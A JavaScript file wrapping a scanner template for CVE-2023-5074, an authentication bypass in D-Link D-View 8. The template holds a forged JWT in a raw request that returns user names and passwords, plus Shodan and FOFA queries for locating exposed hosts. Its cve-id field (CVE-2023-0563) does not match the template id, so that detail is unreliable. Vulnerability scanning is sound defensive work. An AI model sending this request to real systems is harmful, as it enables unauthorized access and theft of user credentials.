export const templateData = `
id: CVE-2023-5074

info:
  name: D-Link D-View 8 v2.0.1.28 - Authentication Bypass
  author: DhiyaneshDK
  severity: critical
  description: |
    Use of a static key to protect a JWT token used in user authentication can allow an for an authentication bypass in D-Link D-View 8 v2.0.1.28
  remediation: |
    Upgrade to the latest version to mitigate this vulnerability.
  reference:
    - https://www.tenable.com/security/research/tra-2023-32
    - https://nvd.nist.gov/vuln/detail/CVE-2023-5074
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2023-0563
    cwe-id: CWE-798
    epss-score: 0.00563
    epss-percentile: 0.74832
    cpe: cpe:2.3:a:dlink:d-view_8:2.0.1.28:*:*:*:*:*:*:*
  metadata:
    verified: true
    max-request: 1
    shodan-query: http.favicon.hash:-1317621215
    fofa-query: icon_hash="-1317621215"
    vendor: dlink
    product: d-view_8
  tags: cve,cve2023,d-link,auth-bypass

http:
  - raw:
      - |
        GET /dview8/api/usersByLevel HTTP/1.1
        Host: {{Hostname}}
        Authorization: eyJhbGciOiAiSFMyNTYiLCJ0eXAiOiAiand0In0.eyJvcmdJZCI6ICIxMjM0NTY3OC0xMjM0LTEyMzQtMTIzNC0xMjM0NTY3ODA5YWEiLCJ1c2VySWQiOiAiNTkxNzFkNTYtZTZiNC00Nzg5LTkwZmYtYTdhMjdmZDQ4NTQ4IiwidHlwZSI6IDMsImtleSI6ICIxMjM0NTY3OC0xMjM0LTEyMzQtMTIzNC0xMjM0NTY3ODkwYmIiLCJpYXQiOiAxNjg2NzY1MTk4LCJqdGkiOiAiZmRhOGU1YzNlNWY1MTQ5MDMzZThiM2FkNWI3ZDhjMjUiLCJuYmYiOiAxNjg2NzYxNTk4LCJleHAiOiAxODQ0NDQ1MTk4fQ.5swhQdiev4r8ZDNkJAFVkGfRTIaUQlwVue2AI18CrcI

    matchers:
      - type: dsl
        dsl:
          - 'status_code == 200'
          - 'contains(body, "userName") && contains(body, "passWord") && contains(body, "isEmailActivate")'
          - 'contains(header, "application/json")'
        condition: and
    `;
